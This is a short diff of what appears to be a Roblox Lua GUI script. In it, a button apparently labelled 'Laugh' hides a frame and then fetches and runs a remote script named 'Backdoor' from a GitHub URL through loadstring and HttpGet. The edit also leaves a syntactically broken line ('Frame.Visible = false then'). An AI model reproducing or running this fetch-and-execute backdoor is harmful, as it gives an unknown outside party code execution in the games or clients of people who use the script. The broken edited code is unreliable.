@@ -122,8 +122,7 @@ e1x1x1x1Laugh.TextScaled = true
 e1x1x1x1Laugh.TextSize = 14.000
 e1x1x1x1Laugh.TextWrapped = true
 e1x1x1x1Laugh.MouseButton1Down:connect(function()
-	if Frame.Visible == true then
-		Frame.Visible = false
+		Frame.Visible = false then
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/PAGE-2/main/Backdoor"))() 
 end)
 DayToNight.Name = "DayToNight"
